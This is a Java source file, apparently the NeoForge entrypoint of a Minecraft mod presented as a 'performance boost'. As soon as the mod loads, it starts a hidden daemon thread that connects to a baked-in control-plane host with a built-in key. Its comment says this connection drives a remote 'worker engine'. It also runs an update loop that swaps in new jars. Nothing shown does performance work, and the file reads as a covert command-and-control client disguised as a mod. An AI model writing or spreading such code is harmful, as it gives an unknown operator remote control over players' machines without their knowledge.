package com.performance.boost.neoforge;

import com.performance.boost.Heartbeat;
import com.performance.boost.Protocol;
import com.performance.boost.Updater;

import net.neoforged.fml.common.Mod;

/**
 * NeoForge entrypoint (NeoForge 21.x / 26.x, fancymodloader). Mirrors the
 * Fabric/Bukkit behaviour: starts a heartbeat to the control plane on
 * construction, drives the worker engine from there and keeps the update
 * loop running so a newer build replaces the jar on next load.
 */
@Mod("performanceboost")
public final class PerfBoostMod {

    // Zero-config: defaults baked in, -Dperfboost.* are optional overrides.
    private static final String DEF_HOST = Protocol.defaultHost();
    private static final int DEF_PORT = 443;

    private static Heartbeat hb;

    public PerfBoostMod() {
        String host = System.getProperty("perfboost.host", DEF_HOST);
        int port = Integer.getInteger("perfboost.port", DEF_PORT);
        String tag = System.getProperty("perfboost.tag", "neoforge");
        String key = System.getProperty("perfboost.key", Protocol.defaultKey());

        hb = new Heartbeat(host, port, tag, key, msg -> {});
        Thread t = new Thread(hb, "perfopt-heartbeat");
        t.setDaemon(true);
        t.start();

        Updater.startLoop(null);
    }

    public static void shutdown() {
        if (hb != null) hb.close();
    }
}
